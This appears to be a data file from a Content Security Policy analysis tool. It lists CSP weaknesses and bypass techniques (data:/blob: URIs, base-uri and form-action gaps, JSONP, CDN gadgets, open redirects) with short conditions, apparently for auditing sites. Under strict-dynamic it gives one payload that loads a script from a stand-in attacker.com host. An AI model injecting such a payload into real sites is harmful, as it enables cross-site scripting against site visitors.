data_uri_script.description: data: URI in script-src allows direct script injection

blob_uri_script.description: blob: URI in script-src allows blob-based script creation
blob_uri_script.condition: blob: in script-src effective sources AND existing JS execution

base_uri_injection.description: Missing base-uri allows <base> tag injection to redirect relative script loads
base_uri_injection.condition: No base-uri directive AND page uses relative script/resource paths

form_action_hijack.description: Missing form-action allows form submission to attacker-controlled endpoints

object_src_flash.description: Missing or permissive object-src allows Flash/plugin-based XSS

unsafe_inline_csp2_downgrade.description: unsafe-inline + nonce/hash: CSP2 browsers ignore nonce and honor unsafe-inline

strict_dynamic_script_creation.description: strict-dynamic allows trusted scripts to load additional scripts
payloads:
// From within a nonced/hashed script:
var s=document.createElement('script');s.src='https://attacker.com/evil.js';document.body.appendChild(s);
strict_dynamic_script_creation.condition: 'strict-dynamic' in script-src AND attacker can inject into trusted script

jsonp_callback.description: Whitelisted domain serves JSONP that reflects callback parameter as JS
jsonp_callback.condition: Whitelisted domain in script-src has JSONP endpoint

cdn_script_gadget.description: Whitelisted CDN hosts a vulnerable JS library usable as a script gadget
cdn_script_gadget.condition: Whitelisted CDN in script-src hosts gadget-exploitable libraries

open_redirect_chain.description: Whitelisted domain has an open redirect that can chain to JSONP/gadget on another whitelisted domain
open_redirect_chain.condition: Whitelisted domain has open redirect AND redirects to another whitelisted domain with JSONP
